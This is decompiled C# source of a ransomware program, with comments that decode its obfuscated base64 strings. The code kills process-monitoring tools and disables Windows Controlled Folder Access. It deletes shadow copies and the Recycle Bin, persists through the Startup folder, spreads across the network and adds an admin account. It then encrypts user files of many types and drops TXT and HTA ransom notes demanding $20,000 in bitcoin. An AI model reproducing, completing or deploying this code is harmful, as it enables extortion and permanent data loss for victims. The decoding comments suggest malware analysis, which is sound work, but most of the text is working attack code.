using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using KillClass;
using lowFQsJSlrFgr;
using Microsoft.Win32;

namespace MufMaOSvGyvz
{
	// Token: 0x02000002 RID: 2
	internal class MainCore
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002730 File Offset: 0x00000930
		private static void Main(string[] args)
		{
			try
			{
				Mutex.GenerateMutex(MainCore.YQBusMLxsiehe);
			}
			catch (Exception)
			{
			}
			try
			{
				if (MainCore.gcOHYvBogGyw == "YES")
				{
					new Thread(new ThreadStart(Process.KillBlacklistProcess))
					{
						Priority = ThreadPriority.Lowest,
						IsBackground = true
					}.Start();
				}
			}
			catch
			{
			}
			if (MainCore.kqxgiwAmxJZAF == "YES")
			{
				Thread.Sleep(int.Parse(MainCore.efojwxvnMIbXXP));
			}
			try
			{
				if (MainCore.wEFLZtRchlX == "YES")
				{
					string text = Launcher.CheckVersionOS();
					if (!text.Contains("Windows 10") && !text.Contains("Windows 8"))
					{
						Launcher.InitLauncher();
					}
				}
			}
			catch (Exception)
			{
			}
			if (MainCore.mlQgpavlrIuX == "YES")
			{
				try
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						new Thread(new ThreadStart(new MainCore.qnaQFtvgrosG
						{
							qbsdORlwvxu = new string[]
							{
								MainCore.DecodeBase64("VGFza21ncg=="), // VGFza21ncg== -> Taskmgr
								MainCore.DecodeBase64("dGFza21ncg=="), // dGFza21ncg== -> taskmgr
								MainCore.DecodeBase64("UHJvY2Vzc0hhY2tlcg=="),// UHJvY2Vzc0hhY2tlcg==-> ProcessHacker
								MainCore.DecodeBase64("cHJvY2V4cA==")// cHJvY2V4cA== -> procexp
							}
						}.<Main>b__5))
						{
							IsBackground = true
						}.Start();
					}
				}
				catch
				{
				}
				try
				{
					Memory.Init(MainCore.DecodeBase64("dGFza21ncg==")); // dGFza21ncg== ->  taskmgr
				}
				catch
				{
				}
				try
				{
					Memory.Init(MainCore.DecodeBase64("cHJvY2V4cA==")); // cHJvY2V4cA== -> procexp
				}
				catch
				{
				}
				try
				{
					Memory.Init(MainCore.DecodeBase64("cHJvY2V4cDY0")); // cHJvY2V4cDY0 -> procexp64
				}
				catch
				{
				}
				try
				{
					Memory.Init(MainCore.DecodeBase64("UHJvY2Vzc0hhY2tlcg==")); // UHJvY2Vzc0hhY2tlcg== -> ProcessHacker
				}
				catch
				{
				}
				new Thread(new ThreadStart(ClassDown.NewProcess))
				{
					IsBackground = true
				}.Start();
			}
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && MainCore.qqibCzLAGVg == "YES")
			{
				try
				{
					MainCore.LaunchPowershell(MainCore.DecodeBase64("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA==")); 
					// -> Set-MpPreference -EnableControlledFolderAccess Disabled
				}
				catch
				{
				}
			}
			if (MainCore.IUvwjPVcqFrE == "YES")
			{
				ModifRegitry.SetRegistryKey();
			}
			if (MainCore.PVCmRrdzBeoM == "YES" && !Debug.CheckAdminRights())
			{
				Debug.CheckDebug();
			}
			if (MainCore.udJVdpbosFv == "YES" && Debug.CheckAdminRights())
			{
				new kernel().DisableTaskManager(false);
				new kernel().PushACERights();
			}
			if (MainCore.LDNdJBbfsdAY == "YES")
			{
				Kill.KillSwitch();
			}
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string str = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string b = str + Path.GetFileName(fileName);
			if (MainCore.SMVGmorJMiSRUva == "YES" && fileName != b)
			{
				new Thread(new ThreadStart(MainCore.VerifyNETVersion))
				{
					IsBackground = true,
					Priority = ThreadPriority.Highest
				}.Start();
			}
			if (MainCore.JNHKDqKmSycXVyA == "YES" && mainModule != null)
			{
				if (fileName != b)
				{
					try
					{
						MainCore.hXaNTqTbRnpr = MainCore.RandomNumber(0, MainCore.wiZlVeXAvqcJt.Count);
						File.Copy(fileName, str + MainCore.wiZlVeXAvqcJt[MainCore.hXaNTqTbRnpr], true);
						Process.Start(str + MainCore.wiZlVeXAvqcJt[MainCore.hXaNTqTbRnpr]);
						MainCore.ExecuteCommands();
						Process.GetCurrentProcess().Kill();
					}
					catch (Exception)
					{
					}
				}
			}
			try
			{
				if (MainCore.lMBJRPlmLoPIJX == "YES" && DateTime.Now < MainCore.OOZMRHMVMrmD)
				{
					return;
				}
			}
			catch
			{
			}
			try
			{
				if (MainCore.zHSVICJAOa == "YES" && DateTime.Now > MainCore.LViAigNUQAbNhB)
				{
					MainCore.ExecuteCommands();
				}
			}
			catch
			{
			}
			foreach (string wxrufMgRtpdSU in MainCore.ypieyuCOltLWYFl)
			{
				MainCore.CreateProcess("net.exe", wxrufMgRtpdSU);
			}
			foreach (string wxrufMgRtpdSU2 in MainCore.YDWHvbVPBJ)
			{
				MainCore.CreateProcess("sc.exe", wxrufMgRtpdSU2);
			}
			foreach (string wxrufMgRtpdSU3 in MainCore.AgdpzRigFOYhsqvH)
			{
				MainCore.CreateProcess("taskkill.exe", wxrufMgRtpdSU3);
			}
			foreach (string wxrufMgRtpdSU4 in MainCore.WRakAWHNtJErZ)
			{
				MainCore.CreateProcess(MainCore.DecodeBase64("dnNzYWRtaW4uZXhl"), wxrufMgRtpdSU4); // dnNzYWRtaW4uZXhl -> vssadmin.exe
			}
			foreach (string wxrufMgRtpdSU5 in MainCore.PMQqUDKVTQJ)
			{
				MainCore.CreateProcess(MainCore.DecodeBase64("ZGVsLmV4ZQ=="), wxrufMgRtpdSU5); // ZGVsLmV4ZQ== -> del.exe
			}
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				MainCore.CreateProcess("cmd.exe", "/c rd /s /q %SYSTEMDRIVE%\\$Recycle.bin");
			}
			if (MainCore.ELyYGppfySYfq == "YES" && MainCore.CheckConnect() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				new Thread(new ThreadStart(Spread.RemoteSpread))
				{
					IsBackground = true
				}.Start();
			}
			if (!(MainCore.OZagXxYpUbG == "YES"))
			{
			}
			if (MainCore.VgdNVBEBhpUPO == "NO")
			{
				MainCore.KRFQhWmJuhVexr = Random.RandomString(32);
			}
			else
			{
				MainCore.KRFQhWmJuhVexr = "LD2WALLJZR93XK10KS892LMU006ZXO3Q"; // Base Chars
			}
			string masterKey = Key.GetMasterKey(MainCore.KRFQhWmJuhVexr);
			if (MainCore.ldDdAgsFLTkAX == "YES")
			{
				MainCore.PushAdminNotification();
			}
			Shortcut.CreateShortcut(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), MainCore.KYDuKlMFWLOzqeDUz), MainCore.PushRansomNote(masterKey), null, null, "Installer...", "Ctrl+Shift+X", null);
			try
			{
				MainCore.ListDiskToEncrypt(new string[]
				{
					"[auto]"
				}, new string[]
				{
					"dat",
					"txt",
					"jpeg",
					"gif",
					"jpg",
					"png",
					"php",
					"cs",
					"cpp",
					"rar",
					"zip",
					"html",
					"htm",
					"xlsx",
					"xls",
					"avi",
					"mp4",
					"ppt",
					"doc",
					"docx",
					"sxi",
					"sxw",
					"odt",
					"hwp",
					"tar",
					"bz2",
					"mkv",
					"eml",
					"msg",
					"ost",
					"pst",
					"edb",
					"sql",
					"accdb",
					"mdb",
					"dbf",
					"odb",
					"myd",
					"php",
					"java",
					"cpp",
					"pas",
					"asm",
					"key",
					"pfx",
					"pem",
					"p12",
					"csr",
					"gpg",
					"aes",
					"vsd",
					"odg",
					"raw",
					"nef",
					"svg",
					"psd",
					"vmx",
					"vmdk",
					"vdi",
					"lay6",
					"sqlite3",
					"sqlitedb",
					"accdb",
					"java",
					"class",
					"mpeg",
					"djvu",
					"tiff",
					"backup",
					"pdf",
					"cert",
					"docm",
					"xlsm",
					"dwg",
					"bak",
					"qbw",
					"nd",
					"tlg",
					"lgb",
					"pptx",
					"mov",
					"xdw",
					"ods",
					"wav",
					"mp3",
					"aiff",
					"flac",
					"m4a",
					"csv",
					"sql",
					"ora",
					"mdf",
					"ldf",
					"ndf",
					"dtsx",
					"rdl",
					"dim",
					"mrimg",
					"qbb",
					"rtf",
					"7z"
				}, new string[0], MainCore.KRFQhWmJuhVexr, ".crypted");
			}
			catch
			{
			}
			MainCore.KRFQhWmJuhVexr = Random.RandomString(32);
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
			{
				using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
				{
					streamWriter.WriteLine(MainCore.DecodeBase64("WW91ciBmaWxlcyB3ZXJlIHNhZmVseSBjeXBoZXJlZC4NCg0KQ29udGFjdDogbXktY29udGFjdC1lbWFpbEBwcm90b25tYWlsLmNvbQ=="));
					//Your files were safely cyphered./nContact: my-contact-email@protonmail.com
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(MainCore.DecodeBase64("S2V5IElkZW50aWZpZXI6IA==")); // Key Identifier: 
					streamWriter.WriteLine(masterKey);
					if (MainCore.FsmxXwwVyXze == "NO")
					{
						streamWriter.WriteLine("\r\n");
						streamWriter.WriteLine(MainCore.DecodeBase64("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(MainCore.CfvwdOobMuXeStMb.Count));
						// -> Number of files that were processed is: 
					}
					goto IL_AF6;
				}
			}
			File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt", "\r\nAditional KeyId:\r\n" + masterKey);
			IL_AF6:
			foreach (string text2 in MainCore.CSiGcEXgTf)
			{
				if (!(text2 == Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
				{
					try
					{
						if (!File.Exists(text2 + "\\HOW_TO_DECYPHER_FILES.txt"))
						{
							File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt", text2 + "\\HOW_TO_DECYPHER_FILES.txt", true);
						}
						else
						{
							File.AppendAllText(text2 + "\\HOW_TO_DECYPHER_FILES.txt", "\r\nAditional KeyId:\r\n" + masterKey);
						}
					}
					catch (Exception)
					{
					}
				}
			}
			if (MainCore.JGjnyMyTennfuufcT == "YES")
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
				{
					using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
					{
						streamWriter.WriteLine(MainCore.DecodeBase64("PGh0bWw+Cjxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsiPgo8cCBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsiPjxzcGFuIHN0eWxlPSJjb2xvcjogI2ZmMDAwMDsgYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7Ij48c3BhbiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsiPjxzcGFuIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjZmYwMDAwOyI+PGltZyBzcmM9Imh0dHBzOi8vY3V0ZXdhbGxwYXBlci5vcmcvMjEvc2t1bGwtd2FsbHBhcGVyLWZyZWUvU2t1bGwtV2FsbHBhcGVyLTNELVdhbGxwYXBlcnMtTGF0ZXN0LmpwZyIgYWx0PSIiIHdpZHRoPSI2NTAiIGhlaWdodD0iNDAzIiAvPjwvc3Bhbj48L3NwYW4+PC9zcGFuPjwvcD4KCjxoMiBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBjb2xvcjpyZWQ7Ij4KWW91ciBGaWxlcyBhcmUgRW5jcnlwdGVkLjwvaDI+PGJyPgo8cCBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBjb2xvcjpyZWQ7IGZvbnQtd2VpZ2h0OiBib2xkOyI+CkRvbuKAmXQgd29ycnksIHlvdSBjYW4gcmV0dXJuIGFsbCB5b3VyIGZpbGVzITxicj4KSSBkb24ndCB3YW50IHRvIGxvb3NlIHlvdXIgZmlsZXMgdG9vLiBpZiBpIHdhbnQgdG8gZG8gc29tZXRoaW5nIGJhZCB0byB5b3UgaSB3b3VsZCd2ZSB3aXBlIGFsbCBvZiB5b3VyIG5ldHdvcmsgYnV0IHRoYXQncyBub3QgaGVscGluZyBtZS4gOik8YnI+CnNvIHRlbXBvcmFyeSBhbGwgb2YgeW91ciBmaWxlcyBpcyBtaW5lIG5vdyB1bnRpbCB5b3UgcGF5IHRoZSBwcmljZSBvZiB0aGVtLjxicj4KSWYgeW91IHdhbnQgdG8gcmVzdG9yZSB0aGVtIGNvbnRhY3QgbWUgZnJvbSB0aGUgYWRkcmVzcyBiZWxvdywgaSdsbCBiZSBoYXBweSB0byBoZWxwIHlvdSB0byBnZXQgb3V0IG9mIHRoaXMgc2l0dWF0aW9uLjxicj4KWW91J3ZlIGdvdCA0OCBob3VycygyIERheXMpLCBiZWZvcmUgeW91IGxvc3QgeW91ciBmaWxlcyBmb3JldmVyLjxicj4KSSB3aWxsIHRyZWF0IHlvdSBnb29kIGlmIHlvdSB0cmVhdCBtZSBnb29kIHRvby4KCgo8L3A+CjxoMyBzdHlsZT0iY29sb3I6eWVsbG93OyB0ZXh0LWFsaWduOiBjZW50ZXI7Ij5UaGUgUHJpY2UgdG8gZ2V0IGFsbCB0aGluZ3MgdG8gdGhlIG5vcm1hbCA6IDIwLDAwMCQ8L2gzPgo8aDMgc3R5bGU9ImNvbG9yOnllbGxvdzsgdGV4dC1hbGlnbjogY2VudGVyOyI+IE15IEJUQyBXYWxsZXQgSUQgOiA8cCBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBjb2xvcjpyZWQ7Ij4xRjZzcThZdmZ0VGZ1RTRRY1l4Zks4czVYRlVVSEM3c0Q5PC9wPiA8L2gzPiAKPGgzIHN0eWxlPSJjb2xvcjp5ZWxsb3c7IHRleHQtYWxpZ246IGNlbnRlcjsiPkNvbnRhY3QgOiA8YnI+IGpvc2VwaG51bGxAc2VjbWFpbC5wcm8gPC9oMz4KCjxoMiBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBjb2xvcjpyZWQ7Ij5Db250YWN0OiBqb3NlcGhudWxsQHNlY21haWwucHJvIDwvaDI+CjwvYm9keT4KPC9odG1sPg=="));
						/*
						<html>
						<body style="background-color: black;">
						<p style="text-align: center; background-color: black;"><span style="color: #ff0000; background-color: black;"><span style="background-color: #000000;"><span style="background-color: #ff0000;"><img src="https://cutewallpaper.org/21/skull-wallpaper-free/Skull-Wallpaper-3D-Wallpapers-Latest.jpg" alt="" width="650" height="403" /></span></span></span></p>

						<h2 style="text-align: center; color:red;">
						Your Files are Encrypted.</h2><br>
						<p style="text-align: center; color:red; font-weight: bold;">
						Don’t worry, you can return all your files!<br>
						I don't want to loose your files too. if i want to do something bad to you i would've wipe all of your network but that's not helping me. :)<br>
						so temporary all of your files is mine now until you pay the price of them.<br>
						If you want to restore them contact me from the address below, i'll be happy to help you to get out of this situation.<br>
						You've got 48 hours(2 Days), before you lost your files forever.<br>
						I will treat you good if you treat me good too.


						</p>
						<h3 style="color:yellow; text-align: center;">The Price to get all things to the normal : 20,000$</h3>
						<h3 style="color:yellow; text-align: center;"> My BTC Wallet ID : <p style="text-align: center; color:red;">1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9</p> </h3> 
						<h3 style="color:yellow; text-align: center;">Contact : <br> josephnull@secmail.pro </h3>

						<h2 style="text-align: center; color:red;">Contact: josephnull@secmail.pro </h2>
						</body>
						</html>
						*/
						
						streamWriter.WriteLine("\r\n");
						streamWriter.WriteLine(MainCore.DecodeBase64("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
						// -> <p style="text-align: center;">Key Identifier: 
						streamWriter.WriteLine(masterKey + MainCore.DecodeBase64("PC9wPg==")); // -> </p>
						if (MainCore.FsmxXwwVyXze == "NO")
						{
							streamWriter.WriteLine("\r\n");
							streamWriter.WriteLine(MainCore.DecodeBase64("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + MainCore.DecodeBase64("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(MainCore.CfvwdOobMuXeStMb.Count) + MainCore.DecodeBase64("PC9wPg=="));
							// PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg== -> <p style="text-align: center;">  TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA== -> Number of files that were processed is: PC9wPg== -> </p>
						}
						goto IL_CBF;
					}
				}
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta", MainCore.DecodeBase64("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAditional KeyId:\r\n" + masterKey + MainCore.DecodeBase64("PC9wPg=="));
				// PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg== -> <p style="text-align: center;"> PC9wPg== -> </p>
			}
			IL_CBF:
			if (MainCore.YkwRnYlFytdkH == "YES")
			{
				try
				{
					if (MainCore.FsmxXwwVyXze == "NO")
					{
						ID.GenerateIDMain("URL", "USERNAME", "ACCESO", string.Concat(new string[]
						{
							MainCore.DecodeBase64("Q2xpZW50IElQOiAg"), // -> Client IP:  
							new WebClient().DownloadString(MainCore.DecodeBase64("aHR0cDovL2ljYW5oYXppcC5jb20=")), // -> http://icanhazip.com
							MainCore.DecodeBase64("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), // -> Date of encryption: 
							default(DateTime).Date.ToString(),
							"\r\n",
							MainCore.DecodeBase64("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog"), // -> Number of files encrypted: 
							Convert.ToString(MainCore.CfvwdOobMuXeStMb.Count),
							"\r\n",
							MainCore.DecodeBase64("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), // -> Possible affected files: 
							"\r\n",
							Convert.ToString(MainCore.CfvwdOobMuXeStMb),
							"\r\n",
							MainCore.DecodeBase64("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), // -> Client Unique Identifier Key: 
							masterKey
						}));
					}
					else
					{
						ID.GenerateIDMain("URL", "USERNAME", "ACCESO", string.Concat(new string[]
						{
							MainCore.DecodeBase64("Q2xpZW50IElQOiAg"),// -> Client IP:  
							new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20="),// -> http://icanhazip.com
							MainCore.DecodeBase64("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), // -> Date of encryption: 
							default(DateTime).Date.ToString(),
							"\r\n",
							MainCore.DecodeBase64("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="),// -> Possible affected files: 
							"\r\n",
							Convert.ToString(MainCore.CfvwdOobMuXeStMb),
							"\r\n",
							MainCore.DecodeBase64("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"),// -> Client Unique Identifier Key: 
							masterKey
						}));
					}
				}
				catch
				{
				}
			}
			if (MainCore.IBSndtoMdgy == "YES")
			{
				try
				{
					GetWallpaper.DownloadWallpaper(new Uri(""));
				}
				catch
				{
				}
			}
			if (MainCore.JGjnyMyTennfuufcT == "NO")
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
				{
					Process.Start(MainCore.DecodeBase64("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt");
					// -> notepad.exe
				}
			}
			else if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
			{
				Process.Start(MainCore.DecodeBase64("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta");
				// -> mshta.exe
			}
			if (MainCore.ldDdAgsFLTkAX == "YES")
			{
				if (MainCore.ZPHPKQDuPKi == "YES" && !string.IsNullOrEmpty(MainCore.rqOtfqTYGrTie) && !string.IsNullOrEmpty(MainCore.wrCDlMOHoXr))
				{
					MainCore.ShowNotification(MainCore.rqOtfqTYGrTie, MainCore.wrCDlMOHoXr);
				}
				else
				{
					MainCore.ShowNotification("SW5mb3JtYXRpb24uLi4=", "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==");
					// -> Information... All your files were encrypted, if you want to get them all back, please carefully read the text note located in your desktop...
				}
			}
			if (MainCore.oarFYicwLcOiB != "LOGONISOFF")
			{
				MainCore.AddAdminUser(MainCore.oarFYicwLcOiB);
			}
			if (!string.IsNullOrEmpty(MainCore.idAGkbKivQU))
			{
				try
				{
					File.Delete(MainCore.idAGkbKivQU);
				}
				catch
				{
				}
			}
			if (MainCore.nrUdlkCMdxZ == "YES" && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				try
				{
					string text = MainCore.CheckOS();
					if (!text.Contains("Windows 10") && !text.Contains("Windows 8"))
					{
						File.DepositeFIle("\\\\.\\PhysicalDrive0");
					}
				}
				catch
				{
				}
			}
			if (Launcher.GetMetrics())
			{
				MainCore.CreateProcess("bcdedit.exe", "/deletevalue {default} safeboot");
			}
			if (MainCore.xQMkqhCYTvWMq == "EVET")
			{
				MainCore.ExecuteCommands();
			}
		}

		// Token: 0x06000002 RID: 2
		public static void VerifyNETVersion()
		{
			MessageBox.Show(MainCore.DecodeBase64("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), MainCore.DecodeBase64("QXRlbnRpb24h"), MessageBoxButtons.OK, MessageBoxIcon.Hand);
			// -> This program requires Microsoft .NET Framework v. 4.82 or superior to run properly  QXRlbnRpb24h -> Atention!
		}

		// Token: 0x06000003 RID: 3
		private static int RandomNumber(int int_0, int int_1)
		{
			RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider();
			byte[] array = new byte[4];
			rngcryptoServiceProvider.GetBytes(array);
			int seed = BitConverter.ToInt32(array, 0);
			return new Random(seed).Next(int_0, int_1);
		}

		// Token: 0x06000004 RID: 4
		public static List<string> Ressources(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
		{
			List<string> list = new List<string>();
			Stack<string> stack = new Stack<string>(20);
			stack.Push(string_0);
			while (stack.Count > 0)
			{
				string text = stack.Pop();
				string[] directories;
				try
				{
					directories = Directory.GetDirectories(text);
				}
				catch
				{
					continue;
				}
				string[] array = null;
				try
				{
					if (text.ToLower().Contains("program files") || text.ToLower().Contains("windows") || text.ToLower().Contains("perflogs") || text.ToLower().Contains("internet explorer") || text.ToLower().Contains("programdata") || text.ToLower().Contains("appdata"))
					{
						continue;
					}
					array = Directory.GetFiles(text);
				}
				catch
				{
					continue;
				}
				foreach (string fileName in array)
				{
					try
					{
						FileInfo fileInfo = new FileInfo(fileName);
						if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(MainCore.DecodeBase64("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("HOW_TO_DECYPHER_FILES") && !fileInfo.FullName.EndsWith(".crypted") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(MainCore.KYDuKlMFWLOzqeDUz))
						{
							if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(MainCore.HJhinhnlOMNxIX) * 1024.0 * 1024.0 && MainCore.FFbMRUzulqEpb == "YES")
							{
								list.Add(fileInfo.FullName);
								MainCore.GXekGISbFWfkZ(list, string_1, string_2, string_3, string_4);
								list.Clear();
							}
							else if (File.Exists(fileInfo.FullName) && MainCore.FFbMRUzulqEpb == "NO")
							{
								list.Add(fileInfo.FullName);
								MainCore.GXekGISbFWfkZ(list, string_1, string_2, string_3, string_4);
								list.Clear();
							}
						}
					}
					catch
					{
					}
				}
				foreach (string item in directories)
				{
					stack.Push(item);
				}
			}
			return list;
		}

		// Token: 0x06000005 RID: 5
		public static string CreateProcess(string BevAcsDSfs = "", string wxrufMgRtpdSU = "")
		{
			string result = "";
			try
			{
				Process process = new Process
				{
					StartInfo = new ProcessStartInfo
					{
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						FileName = BevAcsDSfs,
						Arguments = wxrufMgRtpdSU,
						UseShellExecute = false,
						RedirectStandardOutput = true,
						StandardOutputEncoding = Encoding.GetEncoding(850)
					}
				};
				process.Start();
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x06000006 RID: 6
		public static void LaunchPowershell(string string_0)
		{
			Process process = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = "powershell",
					Arguments = string_0,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				}
			};
			process.Start();
		}

		// Token: 0x06000007 RID: 7
		public static string ReverseData(string string_0)
		{
			char[] array = string_0.ToCharArray();
			Array.Reverse(array);
			return new string(array);
		}

		// Token: 0x06000008 RID: 8
		public static string DecodeBase64(string string_0)
		{
			byte[] bytes = Convert.FromBase64String(string_0);
			return Encoding.UTF8.GetString(bytes);
		}

		// Token: 0x06000009 RID: 9
		public static void PushValueWinLogon(string gosrANbQZP = "", string JAqyYWMBBauaTk = "SW5mb3JtYXRpb24uLi4=", string aFKNOLefitUrT = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
		{	// -> Information... All your files were encrypted, if you want to get them all back, please carefully read the text note located in your desktop...
			gosrANbQZP = MainCore.ReverseData("=42bn9Gbul2Vc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U"); 
			// -> SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(MainCore.DecodeBase64(gosrANbQZP), true);
			if (registryKey != null)
			{
				registryKey.SetValue(MainCore.DecodeBase64("TGVnYWxOb3RpY2VDYXB0aW9u"), MainCore.DecodeBase64(JAqyYWMBBauaTk)); // -> LegalNoticeCaption
				registryKey.SetValue(MainCore.DecodeBase64("TGVnYWxOb3RpY2VUZXh0"), MainCore.DecodeBase64(aFKNOLefitUrT)); // -> LegalNoticeText
			}
		}

		// Token: 0x0600000A RID: 10
		public static void PushAdminNotification()
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					if (MainCore.ZPHPKQDuPKi == "YES" && !string.IsNullOrEmpty(MainCore.rqOtfqTYGrTie) && !string.IsNullOrEmpty(MainCore.wrCDlMOHoXr))
					{
						MainCore.PushValueWinLogon("", MainCore.rqOtfqTYGrTie, MainCore.wrCDlMOHoXr);
					}
					else
					{
						MainCore.PushValueWinLogon("", "SW5mb3JtYXRpb24uLi4=", "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==");
						// -> Information... All your files were encrypted, if you want to get them all back, please carefully read the text note located in your desktop...
					}
				}
			}
